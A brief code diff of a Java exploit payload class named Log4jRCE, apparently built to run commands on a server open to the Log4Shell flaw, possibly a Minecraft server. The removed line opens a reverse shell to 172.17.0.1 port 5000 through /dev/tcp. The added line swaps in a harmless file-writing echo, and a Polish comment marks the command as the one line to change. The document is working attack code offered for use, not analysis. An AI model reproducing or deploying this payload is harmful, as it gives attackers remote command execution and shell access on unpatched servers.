@@ -3,8 +3,8 @@ public class Log4jRCE {
                 try {
                     Runtime r = Runtime.getRuntime();
 
-                    // TODO
-                    String[] cmd = {"bash", "-c", "echo 'nohup bash -i >/dev/tcp/172.17.0.1/5000 2>&1 0<&1 &' > /server/script.sh; bash /server/script.sh"}; 
+                    // TODO - tylko poniższą linijkę trzeba zmienić
+                    String[] cmd = {"bash", "-c", "echo 'czesc, tu kacper :DD' > pliczek_na_serverze_mc.txt"};
 
                     Process p = r.exec(cmd);
                     p.waitFor();
